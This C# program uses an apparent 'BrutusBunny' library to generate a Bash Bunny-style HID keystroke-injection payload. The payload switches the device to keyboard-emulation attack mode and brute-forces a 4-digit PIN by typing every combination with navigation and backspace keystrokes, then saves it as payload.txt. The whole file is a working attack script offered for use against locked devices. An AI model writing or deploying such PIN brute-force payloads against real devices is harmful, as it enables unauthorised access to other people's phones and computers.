using System;

namespace BrutusBunny
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                new BrutusBunny().Comment("This is a comment")
                                 .Led(BrutusBunny.LedColor.Blue, BrutusBunny.LedStatus.BlinkFast)
                                 .AttackMode(BrutusBunny.AttackModes.HID)
                                 .Delay(50)
                                 .StartAttack(() => BrutusBunny.CreateDictionaryPin(4))
                                     .Writte()
                                     .Delay(100)
                                     .Down()
                                     .Delay(100)
                                     .Right()
                                     .Delay(50)
                                     .Enter()
                                     .Delay(100)
                                     .Left()
                                     .Delay(100)
                                     .Up()
                                     .Delay(50)
                                     .BackSpace()
                                     .Delay(50)
                                     .BackSpace()
                                     .Delay(50)
                                     .BackSpace()
                                     .Delay(50)
                                     .BackSpace()
                                 .EndAttack()
                                 .Led(BrutusBunny.LedColor.Green, BrutusBunny.LedStatus.Solid)
                                 .Save();

                Console.WriteLine("The payload.txt file was created");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                Console.ReadKey();
            }
        }
    }
}